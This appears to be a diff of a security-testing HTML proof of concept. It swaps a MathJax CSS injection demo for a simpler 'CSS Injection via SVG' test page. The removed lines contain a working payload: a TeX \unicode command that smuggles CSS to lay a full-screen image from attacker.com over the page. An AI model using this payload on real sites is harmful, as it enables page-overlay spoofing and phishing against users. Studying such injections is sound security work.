@@ -2,13 +2,20 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>MathJax CSS Injection PoC</title>
-    <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+    <title>CSS Injection via SVG</title>
+    <style>
+        body {
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f0f0f0;
+        }
+    </style>
 </head>
 <body>
-    <p>Malicious MathJax rendering with CSS Injection:</p>
-    <math-renderer class="js-display-math" style="display: block" data-static-url="https://github.githubassets.com/static" data-run-id="5287bd6428aa015df40f3018f5f9dcc0">
-        $$\unicode[goombafont; color:red; pointer-events: none; z-index: 5; position: fixed; inset: 0; opacity: 100%; background-size: 100% 100%; background-image: url('https://attacker.com/malicious-image.png');]{x0000}$$
-    </math-renderer>
+    <h1>Testing CSS Injection via SVG</h1>
+    <img src="injected.svg" alt="Injected SVG">
 </body>
 </html>
